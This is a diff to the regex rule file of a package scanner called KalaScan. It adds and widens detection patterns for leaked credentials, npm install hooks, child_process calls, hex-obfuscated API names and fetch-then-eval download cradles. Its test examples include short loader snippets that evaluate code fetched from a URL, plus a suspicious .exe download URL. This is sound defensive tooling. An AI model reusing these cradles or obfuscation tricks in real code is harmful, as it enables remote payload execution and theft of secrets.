@@ -1,7 +1,7 @@
 # KalaScan built-in RegEx rules. Embedded at compile time (include_str!).
 #
 # id        stable identifier; never reuse or renumber (baselines and SARIF key on names, people on ids)
-# category  scoping: exfiltration/file_access = scripts + manifests, install_hook = setup.py, others = all scanned files
+# category  scoping: exfiltration/file_access = scripts + manifests, install_hook = setup.py, npm_hook = package.json, others = all scanned files
 # examples  `matches` / `ignores` are run as tests (cargo test rule_examples)
 # `(?-u:\b)` not `\b`: a Unicode word boundary makes the regex engine fall
 # back to its slowest mode on any non-ASCII byte, i.e. on most bundles (5x).
@@ -48,7 +48,7 @@ category = "exfiltration"
 description = "AWS Access Key ID detected — credential leak"
 # Word boundaries: AKIA-shaped runs inside base64 blobs are not keys.
 pattern = '''(?-u:\b)AKIA[0-9A-Z]{16}(?-u:\b)'''
-matches = ['''AKIA1234567890123456''', '''key = "AKIAQ3EGRZ7MXKXH4L5N"''']
+matches = ['''AKIA1234567890123456''', '''key = "AKIAXXXXXXXXXXXXXXXX"''']
 ignores = ['''fGh0AKIAAAB0AAAAAAAAAKMAa''']
 
 [[rule]]
@@ -65,8 +65,8 @@ name = "GitHub Token"
 severity = "critical"
 category = "exfiltration"
 description = "GitHub token detected — credential leak"
-pattern = '''ghp_[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9]{22,}'''
-matches = ['''ghp_abcdefghijklmnopqrstuvwxyz1234567890''']
+pattern = '''gh[opusr]_[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9]{22,}'''
+matches = ['''ghp_abcdefghijklmnopqrstuvwxyz1234567890''', '''gho_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789''']
 
 [[rule]]
 id = "KS-EXF-008"
@@ -208,7 +208,8 @@ name = "child_process (Node.js)"
 severity = "high"
 category = "obfuscation"
 description = "child_process — command injection or payload execution"
-pattern = '''(?:child_process\.exec|child_process\.execSync|child_process\.spawn)'''
+pattern = '''(?:(?-u:\b)(?:child_process|childProcess|cp)\.(?:exec|execSync|execFile|execFileSync|spawn|spawnSync|fork)(?-u:\b)|require\(\s*["']child_process["']\s*\))'''
+matches = ['''const { spawn } = require("child_process");''', '''cp.execSync(cmd)''']
 
 [[rule]]
 id = "KS-EXE-006"
@@ -367,9 +368,11 @@ pattern = '''(?-u:\b)[13][a-km-zA-HJ-NP-Z1-9]{25,34}(?-u:\b)'''
 id = "KS-SUP-001"
 name = "Post-Install Script"
 severity = "high"
-category = "supply_chain"
+# package.json only: `"install":` is a key in plenty of other JSON (ansible-core docs).
+category = "npm_hook"
 description = "npm postinstall/preinstall — supply chain attack vector"
-pattern = '''(?i)"postinstall"\s*:\s*"|"preinstall"\s*:\s*"'''
+pattern = '''(?i)"(?:postinstall|preinstall|install)"\s*:\s*"'''
+matches = ['''"install": "node install.js"''', '''"postinstall": "node setup.js"''']
 
 [[rule]]
 id = "KS-NET-001"
@@ -412,7 +415,7 @@ name = "URL Fetch Command"
 severity = "medium"
 category = "supply_chain"
 description = "URL fetching — possible external payload download"
-pattern = '''(?i)(?:Invoke-WebRequest|curl(?-u:\b)|wget(?-u:\b)|fetch\(|axios\.(?:get|post)|request\.get|(?-u:\b)https?\.(?:request|get)\s*\(|requests\.(?:get|post|put)\s*\(|urlopen\s*\(|urllib\.request|http\.client|XMLHttpRequest|(?-u:\b)dns\.(?:lookup|resolve\w*)\s*\()'''
+pattern = '''(?i)(?:Invoke-WebRequest|curl(?-u:\b)|wget(?-u:\b)|fetch\(|axios\.(?:get|post)|request\.get|(?-u:\b)https?\.(?:request|get)\s*\(|requests\.(?:get|post|put)\s*\(|urlopen\s*\(|urllib\.request|http\.client|XMLHttpRequest|(?-u:\b)dns\.(?:lookup|resolve\w*)\s*\(|Net\.WebClient|Download(?:String|File)\s*\()'''
 
 [[rule]]
 id = "KS-SUP-004"
@@ -585,7 +588,7 @@ name = "Remote Executable Download"
 severity = "high"
 category = "supply_chain"
 description = "Downloads an executable or script from the internet"
-pattern = '''(?i)(?:https?://[^\s"'<>()]+\.(?:exe|dll|scr|msi|bat|cmd|ps1|vbs|hta|elf|dmg|pkg|apk|sh)(?:[?#"'\s)]|$)|cdn\.discordapp\.com/attachments/|certutil(?:\.exe)?\s+-urlcache|bitsadmin(?:\.exe)?\s+/transfer)'''
+pattern = '''(?i)(?:https?://[^\s"'<>()]+\.(?:exe|dll|scr|msi|bat|cmd|ps1|vbs|hta|elf|dmg|pkg|apk|sh)(?:[?#"'\s)\\]|$)|cdn\.discordapp\.com/attachments/|certutil(?:\.exe)?\s+-urlcache|bitsadmin(?:\.exe)?\s+/transfer)'''
 matches = ['''set "EXE_URL=http://paxfallow.ru/Lightshot.exe"''']
 ignores = ['''https://github.com/x/y/releases/download/v1/tool.zip''']
 
@@ -659,7 +662,8 @@ name = "setup.py Install-time Execution"
 severity = "high"
 category = "install_hook"
 description = "setup.py runs shell commands at pip install"
-pattern = '''(?:subprocess\.|os\.system|os\.popen)'''
+pattern = '''(?:subprocess\.|os\.system|os\.popen|from\s+subprocess\s+import|from\s+os\s+import\s+[^\n]*(?-u:\b)(?:system|popen|spawn\w*|exec\w*)(?-u:\b))'''
+matches = ['''from os import system as _ssystem''']
 
 # No `exec(`: `exec(open('pkg/version.py').read())` is the
 # standard version-reading idiom.
@@ -760,3 +764,106 @@ description = "Runs `npm publish` from a script (release tooling, or a registry 
 pattern = '''(?-u:\b)(?:exec|execSync|spawn|spawnSync|execa)\s*\(\s*["'`]npm\s+publish(?-u:\b)'''
 matches = ['''exec('npm publish --access public', (error) => {''']
 ignores = ['''execa('npm', ['publish'])''']
+
+# `eval(data)` right after a fetch callback, or Python's `exec(urlopen(...))`:
+# the whole loader in one statement (estree-util, request-supporter).
+[[rule]]
+id = "KS-EXE-028"
+name = "Download Cradle (fetch then eval)"
+severity = "critical"
+category = "obfuscation"
+description = "Code fetched from a URL is passed straight to eval/exec"
+pattern = '''(?:(?:exec|eval)\s*\(\s*(?:urlopen|urllib\.request\.urlopen|requests\.(?:get|post))\s*\(|(?:(?-u:\b)https?\.get|axios\.(?:get|post)|(?-u:\b)got)\s*\([\s\S]{0,600}?[^.\w$]eval\s*\(|(?-u:\b)fetch\s*\([^\n]{0,200}\.then\s*\([^\n]{0,200}?[^.\w$]eval\s*\()'''
+matches = ['''exec(urlopen(Request(url='https://x.example/raw')).read())''', '''https.get(URL, (res) => {
+  let data = "";
+  res.on("data", chunk => data += chunk);
+  res.on("end", () => { eval(data); });
+});''', '''fetch(u).then(r => r.text()).then(code => eval(code))''']
+ignores = ['''fetch(url).then(r => r.json())''', '''exec(open('pkg/version.py').read())''', '''fetch(url)
+# ... 500 chars later in Python
+eval(expr)''']
+
+# `require`, `axios` and the C2 URL spelled as hex pairs and decoded at
+# runtime (node-log-stream); the `\x` form is covered by Hex Encoding.
+[[rule]]
+id = "KS-EXE-029"
+name = "Hex String Decoder"
+severity = "high"
+category = "obfuscation"
+description = "Decodes hex-pair strings at runtime (fromCharCode(parseInt(.., 16)))"
+pattern = '''fromCharCode\s*\(\s*parseInt\s*\([^,()]*,\s*16\s*\)'''
+matches = ['''h.replace(/../g, m => String.fromCharCode(parseInt(m, 16)))''']
+ignores = ['''String.fromCharCode(parseInt(code, 10))''']
+
+# Credential patterns ported from PagerWesi. Tokens are high: zero hits on
+# 227 clean packages. PEM keys and credentialed DB URLs are medium: test
+# fixtures and docs carry them (cryptography, prisma, mongodb-vscode).
+[[rule]]
+id = "KS-EXF-017"
+name = "GitLab Token"
+severity = "high"
+category = "exfiltration"
+description = "GitLab personal access token"
+pattern = '''(?-u:\b)glpat-[A-Za-z0-9_-]{20,}'''
+# Low-entropy examples: realistic-looking ones trip the repo's own gitleaks gate.
+matches = ['''glpat-xxxxxxxxxxxxxxxxxxxx''']
+
+[[rule]]
+id = "KS-EXF-018"
+name = "JWT Token"
+severity = "high"
+category = "exfiltration"
+description = "Hard-coded JSON Web Token"
+pattern = '''(?-u:\b)eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'''
+matches = ['''eyJxxxxxxxxxxxxxxxxxxxx.eyJxxxxxxxxxxxxxxxxxxxx.xxxxxxxxxxxx''']
+
+[[rule]]
+id = "KS-EXF-019"
+name = "Azure Storage Connection String"
+severity = "high"
+category = "exfiltration"
+description = "Azure storage account key"
+pattern = '''DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[A-Za-z0-9+/=]{40,}'''
+matches = ['''DefaultEndpointsProtocol=https;AccountName=acct;AccountKey=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUV==''']
+
+[[rule]]
+id = "KS-EXF-020"
+name = "GCP Service Account Key"
+severity = "high"
+category = "exfiltration"
+description = "Google Cloud service-account private key JSON"
+pattern = '''"type"\s*:\s*"service_account"[\s\S]{0,400}"private_key_id"'''
+matches = ['''{"type": "service_account", "project_id": "x", "private_key_id": "abc"''']
+
+[[rule]]
+id = "KS-EXF-021"
+name = "Private Key Material"
+severity = "medium"
+category = "exfiltration"
+description = "PEM private key embedded in the package (hygiene; often a test fixture)"
+pattern = '''-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY-----'''
+matches = ['''-----BEGIN RSA PRIVATE KEY-----''']
+
+[[rule]]
+id = "KS-EXF-022"
+name = "Database Connection String with Password"
+severity = "medium"
+category = "exfiltration"
+description = "Database URL carrying credentials (hygiene; often an example)"
+pattern = '''(?i)(?-u:\b)(?:postgres(?:ql)?|mysql|mongodb(?:\+srv)?|redis|amqp)://[^\s:/@"']+:[^\s/@"']+@[^\s"']+'''
+matches = ['''postgres://admin:s3cret@db.internal:5432/app''']
+ignores = ['''postgres://localhost/app''']
+
+# A hex literal that spells an API name. Hex *decoding* is legitimate
+# (debuggers, serial tools); hiding `require`, `child_process` or a URL as
+# hex pairs is not (node-log-stream builds `require("axios").post(url)` this
+# way). Case-insensitive: hex may be upper-case.
+[[rule]]
+id = "KS-EXE-030"
+name = "Hex-Encoded API Name"
+severity = "high"
+category = "obfuscation"
+description = "require / child_process / process.env / a URL spelled as hex pairs"
+pattern = '''(?i)(?:72657175697265|6368696c645f70726f63657373|70726f636573732e656e76|686f73746e616d65|68747470733a2f2f|687474703a2f2f|6178696f73|666574636828|646973636f7264|776562686f6f6b|6f732e75736572496e666f)'''
+matches = ['''g('72657175697265')''', ''''68747470733A2F2F6C6F672D7365727665722E76657263656C2E617070'''']
+ignores = ['''String.fromCharCode(parseInt('7265', 16))''']
